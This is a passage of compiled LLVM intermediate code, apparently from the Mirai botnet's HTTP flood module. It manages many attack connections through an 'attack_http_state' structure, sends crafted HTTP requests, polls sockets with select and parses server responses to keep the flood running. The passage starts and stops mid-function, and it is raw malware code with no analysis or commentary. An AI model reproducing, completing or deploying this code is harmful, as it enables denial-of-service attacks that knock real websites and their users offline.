  %843 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %844 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %845 = call i32 @util_strlen(i8* noundef %844)
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds i8, i8* %843, i64 %846
  %848 = call i32 @util_strcpy(i8* noundef %847, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %849 = load i8*, i8** %14, align 8
  %850 = icmp ne i8* %849, null
  br i1 %850, label %851, label %859

851:                                              ; preds = %842
  %852 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %853 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %854 = call i32 @util_strlen(i8* noundef %853)
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds i8, i8* %852, i64 %855
  %857 = load i8*, i8** %14, align 8
  %858 = call i32 @util_strcpy(i8* noundef %856, i8* noundef %857)
  br label %859

859:                                              ; preds = %851, %842
  %860 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %861 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %860, i32 0, i32 9
  %862 = getelementptr inbounds [9 x i8], [9 x i8]* %861, i64 0, i64 0
  %863 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %864 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %863, i32 0, i32 10
  %865 = getelementptr inbounds [9 x i8], [9 x i8]* %864, i64 0, i64 0
  %866 = call signext i8 @util_strcmp(i8* noundef %862, i8* noundef %865)
  %867 = icmp ne i8 %866, 0
  br i1 %867, label %876, label %868

868:                                              ; preds = %859
  %869 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %870 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %869, i32 0, i32 9
  %871 = getelementptr inbounds [9 x i8], [9 x i8]* %870, i64 0, i64 0
  %872 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %873 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %872, i32 0, i32 10
  %874 = getelementptr inbounds [9 x i8], [9 x i8]* %873, i64 0, i64 0
  %875 = call i32 @util_strcpy(i8* noundef %871, i8* noundef %874)
  br label %876

876:                                              ; preds = %868, %859
  %877 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %878 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %877, i32 0, i32 0
  %879 = load i32, i32* %878, align 4
  %880 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %881 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i64 0, i64 0
  %882 = call i32 @util_strlen(i8* noundef %881)
  %883 = sext i32 %882 to i64
  %884 = call i64 @send(i32 noundef %879, i8* noundef %880, i64 noundef %883, i32 noundef 16384)
  %885 = load i32, i32* %27, align 4
  %886 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %887 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %886, i32 0, i32 3
  store i32 %885, i32* %887, align 4
  %888 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %889 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %888, i32 0, i32 1
  store i8 6, i8* %889, align 4
  %890 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %890, i32 0, i32 0
  %892 = load i32, i32* %891, align 4
  %893 = srem i32 %892, 64
  %894 = zext i32 %893 to i64
  %895 = shl i64 1, %894
  %896 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %897 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %898 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %897, i32 0, i32 0
  %899 = load i32, i32* %898, align 4
  %900 = sdiv i32 %899, 64
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds [16 x i64], [16 x i64]* %896, i64 0, i64 %901
  %903 = load i64, i64* %902, align 8
  %904 = or i64 %903, %895
  store i64 %904, i64* %902, align 8
  %905 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %906 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %905, i32 0, i32 0
  %907 = load i32, i32* %906, align 4
  %908 = load i32, i32* %23, align 4
  %909 = icmp sgt i32 %907, %908
  br i1 %909, label %910, label %915

910:                                              ; preds = %876
  %911 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %912 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %911, i32 0, i32 0
  %913 = load i32, i32* %912, align 4
  %914 = add nsw i32 %913, 1
  store i32 %914, i32* %23, align 4
  br label %915

915:                                              ; preds = %910, %876
  br label %1043

916:                                              ; preds = %636
  %917 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %918 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %917, i32 0, i32 1
  %919 = load i8, i8* %918, align 4
  %920 = zext i8 %919 to i32
  %921 = icmp eq i32 %920, 6
  br i1 %921, label %922, label %949

922:                                              ; preds = %916
  %923 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %924 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %923, i32 0, i32 0
  %925 = load i32, i32* %924, align 4
  %926 = srem i32 %925, 64
  %927 = zext i32 %926 to i64
  %928 = shl i64 1, %927
  %929 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %930 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %931 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %930, i32 0, i32 0
  %932 = load i32, i32* %931, align 4
  %933 = sdiv i32 %932, 64
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds [16 x i64], [16 x i64]* %929, i64 0, i64 %934
  %936 = load i64, i64* %935, align 8
  %937 = or i64 %936, %928
  store i64 %937, i64* %935, align 8
  %938 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %939 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %938, i32 0, i32 0
  %940 = load i32, i32* %939, align 4
  %941 = load i32, i32* %23, align 4
  %942 = icmp sgt i32 %940, %941
  br i1 %942, label %943, label %948

943:                                              ; preds = %922
  %944 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %945 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %944, i32 0, i32 0
  %946 = load i32, i32* %945, align 4
  %947 = add nsw i32 %946, 1
  store i32 %947, i32* %23, align 4
  br label %948

948:                                              ; preds = %943, %922
  br label %1042

949:                                              ; preds = %916
  %950 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %951 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %950, i32 0, i32 1
  %952 = load i8, i8* %951, align 4
  %953 = zext i8 %952 to i32
  %954 = icmp eq i32 %953, 7
  br i1 %954, label %955, label %982

955:                                              ; preds = %949
  %956 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %957 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %956, i32 0, i32 0
  %958 = load i32, i32* %957, align 4
  %959 = srem i32 %958, 64
  %960 = zext i32 %959 to i64
  %961 = shl i64 1, %960
  %962 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %963 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %964 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %963, i32 0, i32 0
  %965 = load i32, i32* %964, align 4
  %966 = sdiv i32 %965, 64
  %967 = sext i32 %966 to i64
  %968 = getelementptr inbounds [16 x i64], [16 x i64]* %962, i64 0, i64 %967
  %969 = load i64, i64* %968, align 8
  %970 = or i64 %969, %961
  store i64 %970, i64* %968, align 8
  %971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %971, i32 0, i32 0
  %973 = load i32, i32* %972, align 4
  %974 = load i32, i32* %23, align 4
  %975 = icmp sgt i32 %973, %974
  br i1 %975, label %976, label %981

976:                                              ; preds = %955
  %977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %977, i32 0, i32 0
  %979 = load i32, i32* %978, align 4
  %980 = add nsw i32 %979, 1
  store i32 %980, i32* %23, align 4
  br label %981

981:                                              ; preds = %976, %955
  br label %1041

982:                                              ; preds = %949
  %983 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %984 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %983, i32 0, i32 1
  %985 = load i8, i8* %984, align 4
  %986 = zext i8 %985 to i32
  %987 = icmp eq i32 %986, 10
  br i1 %987, label %988, label %1015

988:                                              ; preds = %982
  %989 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %990 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %989, i32 0, i32 0
  %991 = load i32, i32* %990, align 4
  %992 = srem i32 %991, 64
  %993 = zext i32 %992 to i64
  %994 = shl i64 1, %993
  %995 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %996 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %997 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %996, i32 0, i32 0
  %998 = load i32, i32* %997, align 4
  %999 = sdiv i32 %998, 64
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds [16 x i64], [16 x i64]* %995, i64 0, i64 %1000
  %1002 = load i64, i64* %1001, align 8
  %1003 = or i64 %1002, %994
  store i64 %1003, i64* %1001, align 8
  %1004 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1004, i32 0, i32 0
  %1006 = load i32, i32* %1005, align 4
  %1007 = load i32, i32* %23, align 4
  %1008 = icmp sgt i32 %1006, %1007
  br i1 %1008, label %1009, label %1014

1009:                                             ; preds = %988
  %1010 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1011 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1010, i32 0, i32 0
  %1012 = load i32, i32* %1011, align 4
  %1013 = add nsw i32 %1012, 1
  store i32 %1013, i32* %23, align 4
  br label %1014

1014:                                             ; preds = %1009, %988
  br label %1040

1015:                                             ; preds = %982
  %1016 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1017 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1016, i32 0, i32 1
  %1018 = load i8, i8* %1017, align 4
  %1019 = zext i8 %1018 to i32
  %1020 = icmp eq i32 %1019, 11
  br i1 %1020, label %1021, label %1030

1021:                                             ; preds = %1015
  %1022 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1023 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1022, i32 0, i32 1
  store i8 0, i8* %1023, align 4
  %1024 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1025 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1024, i32 0, i32 0
  %1026 = load i32, i32* %1025, align 4
  %1027 = call i32 @close(i32 noundef %1026)
  %1028 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1029 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1028, i32 0, i32 0
  store i32 -1, i32* %1029, align 4
  br label %1039

1030:                                             ; preds = %1015
  %1031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1031, i32 0, i32 1
  store i8 0, i8* %1032, align 4
  %1033 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1034 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1033, i32 0, i32 0
  %1035 = load i32, i32* %1034, align 4
  %1036 = call i32 @close(i32 noundef %1035)
  %1037 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1038 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1037, i32 0, i32 0
  store i32 -1, i32* %1038, align 4
  br label %1039

1039:                                             ; preds = %1030, %1021
  br label %1040

1040:                                             ; preds = %1039, %1014
  br label %1041

1041:                                             ; preds = %1040, %981
  br label %1042

1042:                                             ; preds = %1041, %948
  br label %1043

1043:                                             ; preds = %1042, %915
  br label %1044

1044:                                             ; preds = %1043, %635
  br label %1045

1045:                                             ; preds = %1044, %586
  br label %1046

1046:                                             ; preds = %1045, %600, %523
  %1047 = load i32, i32* %9, align 4
  %1048 = add nsw i32 %1047, 1
  store i32 %1048, i32* %9, align 4
  br label %475, !llvm.loop !12

1049:                                             ; preds = %475
  %1050 = load i32, i32* %23, align 4
  %1051 = icmp eq i32 %1050, 0
  br i1 %1051, label %1052, label %1053

1052:                                             ; preds = %1049
  br label %440

1053:                                             ; preds = %1049
  %1054 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1054, align 8
  %1055 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1055, align 8
  %1056 = load i32, i32* %23, align 4
  %1057 = call i32 @select(i32 noundef %1056, %struct.fd_set* noundef %21, %struct.fd_set* noundef %22, %struct.fd_set* noundef null, %struct.timeval* noundef %25)
  store i32 %1057, i32* %24, align 4
  %1058 = call i64 @time(i64* noundef null) #6
  %1059 = trunc i64 %1058 to i32
  store i32 %1059, i32* %27, align 4
  %1060 = load i32, i32* %24, align 4
  %1061 = icmp slt i32 %1060, 1
  br i1 %1061, label %1062, label %1063

1062:                                             ; preds = %1053
  br label %440

1063:                                             ; preds = %1053
  store i32 0, i32* %9, align 4
  br label %1064

1064:                                             ; preds = %2543, %1063
  %1065 = load i32, i32* %9, align 4
  %1066 = load i32, i32* %18, align 4
  %1067 = icmp slt i32 %1065, %1066
  br i1 %1067, label %1068, label %2546

1068:                                             ; preds = %1064
  %1069 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1070 = load i32, i32* %9, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1069, i64 %1071
  store %struct.attack_http_state* %1072, %struct.attack_http_state** %26, align 8
  %1073 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1074 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1073, i32 0, i32 0
  %1075 = load i32, i32* %1074, align 4
  %1076 = icmp eq i32 %1075, -1
  br i1 %1076, label %1077, label %1078

1077:                                             ; preds = %1068
  br label %2543

1078:                                             ; preds = %1068
  %1079 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1080 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1081 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1080, i32 0, i32 0
  %1082 = load i32, i32* %1081, align 4
  %1083 = sdiv i32 %1082, 64
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds [16 x i64], [16 x i64]* %1079, i64 0, i64 %1084
  %1086 = load i64, i64* %1085, align 8
  %1087 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1088 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1087, i32 0, i32 0
  %1089 = load i32, i32* %1088, align 4
  %1090 = srem i32 %1089, 64
  %1091 = zext i32 %1090 to i64
  %1092 = shl i64 1, %1091
  %1093 = and i64 %1086, %1092
  %1094 = icmp ne i64 %1093, 0
  br i1 %1094, label %1095, label %1119

1095:                                             ; preds = %1078
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1096 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1097 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1096, i32 0, i32 0
  %1098 = load i32, i32* %1097, align 4
  %1099 = bitcast i32* %35 to i8*
  %1100 = call i32 @getsockopt(i32 noundef %1098, i32 noundef 1, i32 noundef 4, i8* noundef %1099, i32* noundef %36) #6
  store i32 %1100, i32* %12, align 4
  %1101 = load i32, i32* %35, align 4
  %1102 = icmp eq i32 %1101, 0
  br i1 %1102, label %1103, label %1109

1103:                                             ; preds = %1095
  %1104 = load i32, i32* %12, align 4
  %1105 = icmp eq i32 %1104, 0
  br i1 %1105, label %1106, label %1109

1106:                                             ; preds = %1103
  %1107 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1107, i32 0, i32 1
  store i8 4, i8* %1108, align 4
  br label %1118

1109:                                             ; preds = %1103, %1095
  %1110 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1111 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1110, i32 0, i32 0
  %1112 = load i32, i32* %1111, align 4
  %1113 = call i32 @close(i32 noundef %1112)
  %1114 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1115 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1114, i32 0, i32 0
  store i32 -1, i32* %1115, align 4
  %1116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1116, i32 0, i32 1
  store i8 0, i8* %1117, align 4
  br label %2543

1118:                                             ; preds = %1106
  br label %1119

1119:                                             ; preds = %1118, %1078
  %1120 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1121 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1122 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1121, i32 0, i32 0
  %1123 = load i32, i32* %1122, align 4
  %1124 = sdiv i32 %1123, 64
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds [16 x i64], [16 x i64]* %1120, i64 0, i64 %1125
  %1127 = load i64, i64* %1126, align 8
  %1128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1128, i32 0, i32 0
  %1130 = load i32, i32* %1129, align 4
  %1131 = srem i32 %1130, 64
  %1132 = zext i32 %1131 to i64
  %1133 = shl i64 1, %1132
  %1134 = and i64 %1127, %1133
  %1135 = icmp ne i64 %1134, 0
  br i1 %1135, label %1136, label %2542

1136:                                             ; preds = %1119
  %1137 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1137, i32 0, i32 1
  %1139 = load i8, i8* %1138, align 4
  %1140 = zext i8 %1139 to i32
  %1141 = icmp eq i32 %1140, 6
  br i1 %1141, label %1142, label %2105

1142:                                             ; preds = %1136
  store i32 0, i32* %37, align 4
  %1143 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  call void @util_zero(i8* noundef %1143, i32 noundef 10240)
  %1144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1144, i32 0, i32 0
  %1146 = load i32, i32* %1145, align 4
  %1147 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1148 = call i64 @recv(i32 noundef %1146, i8* noundef %1147, i64 noundef 10240, i32 noundef 16386)
  %1149 = trunc i64 %1148 to i32
  store i32 %1149, i32* %12, align 4
  %1150 = icmp slt i32 %1149, 1
  br i1 %1150, label %1151, label %1160

1151:                                             ; preds = %1142
  %1152 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1153 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1152, i32 0, i32 0
  %1154 = load i32, i32* %1153, align 4
  %1155 = call i32 @close(i32 noundef %1154)
  %1156 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1156, i32 0, i32 0
  store i32 -1, i32* %1157, align 4
  %1158 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1159 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1158, i32 0, i32 1
  store i8 0, i8* %1159, align 4
  br label %2543

1160:                                             ; preds = %1142
  %1161 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1162 = load i32, i32* %12, align 4
  %1163 = call i32 @util_memsearch(i8* noundef %1161, i32 noundef %1162, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 noundef 4)
  %1164 = icmp eq i32 %1163, -1
  br i1 %1164, label %1165, label %1169

1165:                                             ; preds = %1160
  %1166 = load i32, i32* %12, align 4
  %1167 = icmp slt i32 %1166, 10240
  br i1 %1167, label %1168, label %1169

1168:                                             ; preds = %1165
  br label %2543

1169:                                             ; preds = %1165, %1160
  %1170 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1171 = load i32, i32* %12, align 4
  %1172 = call i32 @util_memsearch(i8* noundef %1170, i32 noundef %1171, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 noundef 4)
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1173
  store i8 0, i8* %1174, align 1
  %1175 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1176 = load i32, i32* %12, align 4
  %1177 = call i8* @table_retrieve_val(i32 noundef 71, i32* noundef null)
  %1178 = call i32 @util_stristr(i8* noundef %1175, i32 noundef %1176, i8* noundef %1177)
  %1179 = icmp ne i32 %1178, -1
  br i1 %1179, label %1180, label %1183

1180:                                             ; preds = %1169
  %1181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1181, i32 0, i32 11
  store i32 2, i32* %1182, align 4
  br label %1183

1183:                                             ; preds = %1180, %1169
  %1184 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1185 = load i32, i32* %12, align 4
  %1186 = call i8* @table_retrieve_val(i32 noundef 70, i32* noundef null)
  %1187 = call i32 @util_stristr(i8* noundef %1184, i32 noundef %1185, i8* noundef %1186)
  %1188 = icmp ne i32 %1187, -1
  br i1 %1188, label %1189, label %1192

1189:                                             ; preds = %1183
  %1190 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1191 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1190, i32 0, i32 11
  store i32 1, i32* %1191, align 4
  br label %1192

1192:                                             ; preds = %1189, %1183
  %1193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1193, i32 0, i32 12
  store i32 0, i32* %1194, align 4
  %1195 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1196 = load i32, i32* %12, align 4
  %1197 = call i8* @table_retrieve_val(i32 noundef 69, i32* noundef null)
  %1198 = call i32 @util_stristr(i8* noundef %1195, i32 noundef %1196, i8* noundef %1197)
  %1199 = icmp ne i32 %1198, -1
  br i1 %1199, label %1200, label %1251

1200:                                             ; preds = %1192
  %1201 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1202 = load i32, i32* %12, align 4
  %1203 = call i8* @table_retrieve_val(i32 noundef 69, i32* noundef null)
  %1204 = call i32 @util_stristr(i8* noundef %1201, i32 noundef %1202, i8* noundef %1203)
  store i32 %1204, i32* %38, align 4
  %1205 = load i32, i32* %38, align 4
  %1206 = sext i32 %1205 to i64
  %1207 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1206
  %1208 = load i8, i8* %1207, align 1
  %1209 = sext i8 %1208 to i32
  %1210 = icmp eq i32 %1209, 32
  br i1 %1210, label %1211, label %1214

1211:                                             ; preds = %1200
  %1212 = load i32, i32* %38, align 4
  %1213 = add nsw i32 %1212, 1
  store i32 %1213, i32* %38, align 4
  br label %1214

1214:                                             ; preds = %1211, %1200
  %1215 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1216 = load i32, i32* %38, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds i8, i8* %1215, i64 %1217
  %1219 = load i32, i32* %12, align 4
  %1220 = load i32, i32* %38, align 4
  %1221 = sub nsw i32 %1219, %1220
  %1222 = call i32 @util_memsearch(i8* noundef %1218, i32 noundef %1221, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1222, i32* %39, align 4
  %1223 = load i32, i32* %39, align 4
  %1224 = icmp ne i32 %1223, -1
  br i1 %1224, label %1225, label %1250

1225:                                             ; preds = %1214
  %1226 = load i32, i32* %38, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1227
  store i8* %1228, i8** %40, align 8
  %1229 = load i32, i32* %39, align 4
  %1230 = icmp sge i32 %1229, 2
  br i1 %1230, label %1231, label %1234

1231:                                             ; preds = %1225
  %1232 = load i32, i32* %39, align 4
  %1233 = sub nsw i32 %1232, 2
  store i32 %1233, i32* %39, align 4
  br label %1234

1234:                                             ; preds = %1231, %1225
  %1235 = load i32, i32* %38, align 4
  %1236 = load i32, i32* %39, align 4
  %1237 = add nsw i32 %1235, %1236
  %1238 = sext i32 %1237 to i64
  %1239 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1238
  store i8 0, i8* %1239, align 1
  %1240 = load i8*, i8** %40, align 8
  %1241 = load i8*, i8** %40, align 8
  %1242 = call i32 @util_strlen(i8* noundef %1241)
  %1243 = call i8* @table_retrieve_val(i32 noundef 68, i32* noundef null)
  %1244 = call i32 @util_stristr(i8* noundef %1240, i32 noundef %1242, i8* noundef %1243)
  %1245 = icmp ne i32 %1244, 0
  br i1 %1245, label %1246, label %1249

1246:                                             ; preds = %1234
  %1247 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1247, i32 0, i32 12
  store i32 1, i32* %1248, align 4
  br label %1249

1249:                                             ; preds = %1246, %1234
  br label %1250

1250:                                             ; preds = %1249, %1214
  br label %1251

1251:                                             ; preds = %1250, %1192
  %1252 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1253 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1252, i32 0, i32 13
  store i32 0, i32* %1253, align 4
  %1254 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1255 = load i32, i32* %12, align 4
  %1256 = call i8* @table_retrieve_val(i32 noundef 66, i32* noundef null)
  %1257 = call i32 @util_stristr(i8* noundef %1254, i32 noundef %1255, i8* noundef %1256)
  %1258 = icmp ne i32 %1257, -1
  br i1 %1258, label %1259, label %1310

1259:                                             ; preds = %1251
  %1260 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1261 = load i32, i32* %12, align 4
  %1262 = call i8* @table_retrieve_val(i32 noundef 66, i32* noundef null)
  %1263 = call i32 @util_stristr(i8* noundef %1260, i32 noundef %1261, i8* noundef %1262)
  store i32 %1263, i32* %41, align 4
  %1264 = load i32, i32* %41, align 4
  %1265 = sext i32 %1264 to i64
  %1266 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1265
  %1267 = load i8, i8* %1266, align 1
  %1268 = sext i8 %1267 to i32
  %1269 = icmp eq i32 %1268, 32
  br i1 %1269, label %1270, label %1273

1270:                                             ; preds = %1259
  %1271 = load i32, i32* %41, align 4
  %1272 = add nsw i32 %1271, 1
  store i32 %1272, i32* %41, align 4
  br label %1273

1273:                                             ; preds = %1270, %1259
  %1274 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1275 = load i32, i32* %41, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds i8, i8* %1274, i64 %1276
  %1278 = load i32, i32* %12, align 4
  %1279 = load i32, i32* %41, align 4
  %1280 = sub nsw i32 %1278, %1279
  %1281 = call i32 @util_memsearch(i8* noundef %1277, i32 noundef %1280, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1281, i32* %42, align 4
  %1282 = load i32, i32* %42, align 4
  %1283 = icmp ne i32 %1282, -1
  br i1 %1283, label %1284, label %1309

1284:                                             ; preds = %1273
  %1285 = load i32, i32* %41, align 4
  %1286 = sext i32 %1285 to i64
  %1287 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1286
  store i8* %1287, i8** %43, align 8
  %1288 = load i32, i32* %42, align 4
  %1289 = icmp sge i32 %1288, 2
  br i1 %1289, label %1290, label %1293

1290:                                             ; preds = %1284
  %1291 = load i32, i32* %42, align 4
  %1292 = sub nsw i32 %1291, 2
  store i32 %1292, i32* %42, align 4
  br label %1293

1293:                                             ; preds = %1290, %1284
  %1294 = load i32, i32* %41, align 4
